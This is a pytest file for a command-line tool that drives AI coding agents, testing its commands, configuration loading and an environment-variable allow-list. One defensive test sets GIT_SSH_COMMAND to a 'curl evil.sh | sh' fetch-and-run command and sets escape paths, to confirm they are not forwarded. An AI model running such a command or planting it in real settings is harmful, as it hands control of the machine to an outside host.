"""Pure-unit tests for the rails CLI skeleton.

No Postgres, no JWKS server, no api/ fixtures -- these tests only exercise
rails.cli / rails.config in-process via typer.testing.CliRunner.
"""

import dataclasses
import os
import shutil
import subprocess
from pathlib import Path

import pytest
from typer.testing import CliRunner

from rails.cli import ENGINES, app
from rails.config import RailsConfig, RailsConfigError
from rails.gate import GateResult, StepResult

runner = CliRunner()

COMMANDS = ("build-feature", "triage", "migrate", "review", "gate", "engines")


def make_config(**over):
    """Direct construction for tests that don't need repo_root discovery."""
    defaults = {"engine": "claude", "max_budget_usd": 2.0, "repo_root": Path(".")}
    defaults.update(over)
    return RailsConfig(**defaults)


# --- CLI: --help -------------------------------------------------------


def test_help_exits_zero_and_lists_all_commands():
    result = runner.invoke(app, ["--help"])
    assert result.exit_code == 0
    for command in COMMANDS:
        assert command in result.output


# --- CLI: engines --------------------------------------------------------


def test_engines_all_present(monkeypatch):
    monkeypatch.setattr(shutil, "which", lambda name: f"/usr/local/bin/{name}")

    result = runner.invoke(app, ["engines"])

    assert result.exit_code == 0
    for engine in ENGINES:
        assert engine in result.output
    assert "missing" not in result.output.lower()


def test_engines_one_missing(monkeypatch):
    def fake_which(name):
        return None if name == "codex" else f"/usr/local/bin/{name}"

    monkeypatch.setattr(shutil, "which", fake_which)

    result = runner.invoke(app, ["engines"])

    assert result.exit_code == 0
    lines = {line.split()[0]: line for line in result.output.splitlines() if line.strip()}
    assert "missing" in lines["codex"].lower()
    assert "missing" not in lines["claude"].lower()
    assert "missing" not in lines["gemini"].lower()


def test_engines_one_line_per_engine_even_with_long_paths(monkeypatch):
    """Output must be pipe-safe: no terminal-width wrapping, one engine = one
    line no matter how long the resolved binary path is."""
    long_dir = "/very/long/prefix" * 8  # > 100 chars
    monkeypatch.setattr(shutil, "which", lambda name: f"{long_dir}/{name}")

    result = runner.invoke(app, ["engines"])

    assert result.exit_code == 0
    lines = [line for line in result.output.splitlines() if line.strip()]
    assert len(lines) == len(ENGINES)
    for engine, line in zip(ENGINES, lines):
        assert line.startswith(engine)


# --- CLI: stub commands exit 1 with "not implemented" on stderr -----------


@pytest.mark.parametrize(
    "args",
    [
        ["triage", "last 24h"],
        ["migrate", "add index on vehicles.vin"],
        ["review", "--pr", "123"],
    ],
)
def test_stub_commands_exit_1_not_implemented(args):
    result = runner.invoke(app, args)
    assert result.exit_code == 1
    assert "not implemented" in result.stderr.lower()


def test_stub_message_goes_to_stderr_not_stdout():
    result = runner.invoke(app, ["migrate", "add index on vehicles.vin"])

    assert result.exit_code == 1
    assert "not implemented" in result.stderr.lower()
    assert result.stdout.strip() == ""


# --- CLI: build-feature (wired in Task 6) ------------------------------


def test_build_feature_help_shows_engine_reviewer_no_pr_flags():
    result = runner.invoke(app, ["build-feature", "--help"])

    assert result.exit_code == 0
    assert "--engine" in result.output
    assert "--reviewer" in result.output
    assert "--no-pr" in result.output


def test_build_feature_calls_agent_with_spec_and_defaults(monkeypatch):
    seen = {}

    def fake_build_feature(cfg, spec, *, engine, reviewer, open_pr):
        seen["cfg"] = cfg
        seen["spec"] = spec
        seen["engine"] = engine
        seen["reviewer"] = reviewer
        seen["open_pr"] = open_pr
        return object()

    monkeypatch.setattr("rails.cli._build_feature", fake_build_feature)
    monkeypatch.setattr(RailsConfig, "load", staticmethod(lambda: make_config()))

    result = runner.invoke(app, ["build-feature", "add a widget"])

    assert result.exit_code == 0
    assert seen["spec"] == "add a widget"
    assert seen["engine"] is None
    assert seen["reviewer"] is None
    assert seen["open_pr"] is True


def test_build_feature_plumbs_engine_reviewer_and_no_pr_flags(monkeypatch):
    seen = {}

    def fake_build_feature(cfg, spec, *, engine, reviewer, open_pr):
        seen["engine"] = engine
        seen["reviewer"] = reviewer
        seen["open_pr"] = open_pr
        return object()

    monkeypatch.setattr("rails.cli._build_feature", fake_build_feature)
    monkeypatch.setattr(RailsConfig, "load", staticmethod(lambda: make_config()))

    result = runner.invoke(
        app,
        [
            "build-feature",
            "add a widget",
            "--engine",
            "codex",
            "--reviewer",
            "claude",
            "--no-pr",
        ],
    )

    assert result.exit_code == 0
    assert seen["engine"] == "codex"
    assert seen["reviewer"] == "claude"
    assert seen["open_pr"] is False


# --- CLI: gate ---------------------------------------------------------


def test_gate_command_prints_summary_and_exits_zero_on_pass(monkeypatch):
    fake_result = GateResult(
        ok=True,
        steps=(
            StepResult(name="ruff-check", ok=True, exit_code=0, duration_s=0.1, output_tail=""),
        ),
    )
    monkeypatch.setattr("rails.cli.run_gate", lambda cwd, **kw: fake_result)
    monkeypatch.setattr(RailsConfig, "load", staticmethod(lambda: make_config()))

    result = runner.invoke(app, ["gate"])

    assert result.exit_code == 0
    assert "ruff-check" in result.stdout
    assert "✓" in result.stdout


def test_gate_command_exits_one_and_prints_failure_tail_on_red_gate(monkeypatch):
    fake_result = GateResult(
        ok=False,
        steps=(
            StepResult(name="pytest", ok=False, exit_code=1, duration_s=0.2, output_tail="boom"),
        ),
    )
    monkeypatch.setattr("rails.cli.run_gate", lambda cwd, **kw: fake_result)
    monkeypatch.setattr(RailsConfig, "load", staticmethod(lambda: make_config()))

    result = runner.invoke(app, ["gate"])

    assert result.exit_code == 1
    assert "pytest" in result.stdout
    assert "boom" in result.stdout


def test_gate_command_passes_repo_root_from_config(monkeypatch, tmp_path):
    seen_cwd = {}

    def fake_run_gate(cwd, **kw):
        seen_cwd["cwd"] = cwd
        return GateResult(ok=True, steps=())

    monkeypatch.setattr("rails.cli.run_gate", fake_run_gate)
    monkeypatch.setattr(RailsConfig, "load", staticmethod(lambda: make_config(repo_root=tmp_path)))

    result = runner.invoke(app, ["gate"])

    assert result.exit_code == 0
    assert seen_cwd["cwd"] == tmp_path


# --- RailsConfig.load() -----------------------------------------------------


def test_config_load_defaults(monkeypatch):
    monkeypatch.delenv("RAILS_ENGINE", raising=False)
    monkeypatch.delenv("RAILS_MAX_BUDGET_USD", raising=False)

    cfg = RailsConfig.load()

    assert cfg.engine == "claude"
    assert cfg.max_budget_usd == 2.0
    assert cfg.repo_root.is_dir()
    assert (cfg.repo_root / "pyproject.toml").is_file()


def test_config_load_reads_env(monkeypatch):
    monkeypatch.setenv("RAILS_ENGINE", "codex")
    monkeypatch.setenv("RAILS_MAX_BUDGET_USD", "5.5")

    cfg = RailsConfig.load()

    assert cfg.engine == "codex"
    assert cfg.max_budget_usd == 5.5


def test_config_load_outside_git_repo_raises_typed_error(monkeypatch):
    def fail_run(*args, **kwargs):
        raise subprocess.CalledProcessError(128, ["git", "rev-parse", "--show-toplevel"])

    import rails.config

    monkeypatch.setattr(rails.config.subprocess, "run", fail_run)

    with pytest.raises(RailsConfigError, match="not inside a git repository"):
        RailsConfig.load()


def test_config_load_bad_budget_raises_typed_error(monkeypatch):
    monkeypatch.setenv("RAILS_MAX_BUDGET_USD", "lots")

    with pytest.raises(RailsConfigError, match="RAILS_MAX_BUDGET_USD must be a number, got 'lots'"):
        RailsConfig.load()


def test_config_is_frozen():
    cfg = make_config()
    with pytest.raises(dataclasses.FrozenInstanceError):
        cfg.engine = "gemini"


# --- RailsConfig.allowed_env() ----------------------------------------------


def test_allowed_env_excludes_canary_and_includes_path(monkeypatch):
    monkeypatch.setenv("RAILS_TEST_CANARY", "leak-me-not")
    cfg = make_config()

    env = cfg.allowed_env()

    assert "RAILS_TEST_CANARY" not in env
    assert "PATH" in env
    assert env["PATH"] == os.environ["PATH"]


def test_allowed_env_includes_git_identity_vars(monkeypatch):
    monkeypatch.setenv("GIT_AUTHOR_NAME", "Rails Bot")
    monkeypatch.setenv("GIT_AUTHOR_EMAIL", "rails@nextlane.dev")
    monkeypatch.setenv("GIT_COMMITTER_NAME", "Rails Bot")
    monkeypatch.setenv("GIT_COMMITTER_EMAIL", "rails@nextlane.dev")
    cfg = make_config()

    env = cfg.allowed_env()

    assert env.get("GIT_AUTHOR_NAME") == "Rails Bot"
    assert env.get("GIT_AUTHOR_EMAIL") == "rails@nextlane.dev"
    assert env.get("GIT_COMMITTER_NAME") == "Rails Bot"
    assert env.get("GIT_COMMITTER_EMAIL") == "rails@nextlane.dev"


def test_allowed_env_excludes_git_execution_and_isolation_hooks(monkeypatch):
    """GIT_* must NOT be forwarded wholesale: several GIT_ vars are
    command-execution hooks (GIT_SSH_COMMAND, GIT_ASKPASS) or worktree
    isolation escapes (GIT_DIR, GIT_WORK_TREE, GIT_CONFIG_COUNT)."""
    dangerous = {
        "GIT_SSH_COMMAND": "curl evil.sh | sh",
        "GIT_ASKPASS": "/tmp/evil-askpass",
        "GIT_DIR": "/somewhere/else/.git",
        "GIT_WORK_TREE": "/somewhere/else",
        "GIT_CONFIG_COUNT": "1",
    }
    for key, value in dangerous.items():
        monkeypatch.setenv(key, value)
    cfg = make_config()

    env = cfg.allowed_env()

    for key in dangerous:
        assert key not in env


def test_allowed_env_merges_explicit_extras(monkeypatch):
    monkeypatch.delenv("RAILS_TEST_EXTRA", raising=False)
    cfg = make_config()

    env = cfg.allowed_env(extra={"RAILS_TEST_EXTRA": "explicit-value"})

    assert env["RAILS_TEST_EXTRA"] == "explicit-value"
